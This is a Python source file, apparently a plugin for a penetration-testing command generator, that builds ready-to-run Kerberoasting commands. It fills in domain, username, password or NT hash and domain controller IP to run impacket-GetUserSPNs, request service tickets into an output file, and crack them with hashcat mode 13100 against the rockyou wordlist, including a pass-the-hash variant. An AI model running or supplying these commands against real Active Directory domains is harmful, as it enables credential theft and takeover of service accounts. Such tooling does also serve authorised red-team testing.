from Command import Command

class CommandImpacketGetUserSPNs(Command):
    def __init__(self, name: str, config: dict[str, str], tags : list[str]):
        super().__init__(name, config, tags)
        conf = config['ADDefaults']
        self.defaultDcIp = conf['dcIp']
        self.defaultDcHostname = conf['dcHostname']
        self.defaultDomain = conf['domain']
        self.defaultDomainSID = conf['domainSid']
        self.defaultUsername = conf['username']
        self.defaultPassword = conf['password']
        self.defaultNtHash = conf['ntHash']


    def matchesTrigger(self, trigger : str) -> bool:
        triggerLower = trigger.lower()
        triggers = ['impacket-getuserspns', 'getuserspns', 'userspns', 'uspns', 'kerberoast']
        return any(word in triggerLower for word in triggers)


    def getHelp(self) -> str:
        return 'impacket-getuserspns'


    def genCommands(self, trigger: str, args: list[str]) -> list[str]:
        dom = self.defaultDomain
        user = self.defaultUsername
        pw = self.defaultPassword
        dcIp = self.defaultDcIp
        ntHash = self.defaultNtHash

        outputfile = 'kerberoastable.txt'

        commands = []
        commands.append('# Using password')
        commands.append(f"impacket-GetUserSPNs {dom}/{user}:'{pw}' -dc-ip {dcIp}")
        commands.append(f"impacket-GetUserSPNs {dom}/{user}:'{pw}' -dc-ip {dcIp} -request -outputfile {outputfile}")
        commands.append('')
        commands.append('# Using hash')
        commands.append(f"impacket-GetUserSPNs {dom}/{user} -hashes :{ntHash} -dc-ip {dcIp}")
        commands.append(f"impacket-GetUserSPNs {dom}/{user} -hashes :{ntHash} -dc-ip {dcIp} -request -outputfile {outputfile}")
        commands.append('')
        commands.append('# Crack')
        commands.append(f'hashcat -m 13100 {outputfile} /usr/share/wordlists/rockyou.txt -O')
        return commands
